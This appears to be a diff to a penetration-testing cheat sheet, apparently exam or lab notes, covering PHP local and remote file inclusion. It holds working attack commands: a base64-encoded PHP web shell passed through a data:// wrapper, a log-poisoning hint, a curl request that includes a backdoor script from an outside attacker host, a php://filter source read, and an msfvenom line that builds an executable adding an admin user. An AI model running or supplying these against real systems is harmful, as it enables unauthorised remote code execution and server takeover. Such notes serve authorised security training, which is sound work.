@@ -134,16 +134,24 @@ msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.e
 
 // Only relevant if site uses PHP
 
+// Try data wrapper
+
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+curl "http://$ip/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+// If site allows for directory traversal try log poisoning with following cmd. And append the URL with &cmd=ls
+
 <?php echo system($_GET['cmd']); ?>
 
-// If contents of .php page are missing, use filter wrapper or data wrapper for code exec.
+// Then
+
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+
+// If contents of .php page are missing, use filter wrapper.
 
 curl http://$ip/index.php?$vulnpageparam=php://filter/convert.base64-encode/resource=$vulnpage.php
 echo "b64encodedoutput" | base64 -d
 
-
-echo -n '<?php echo system($_GET["cmd"]);?>' | base64
-curl "http://$ip/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
 
 ### File uploads
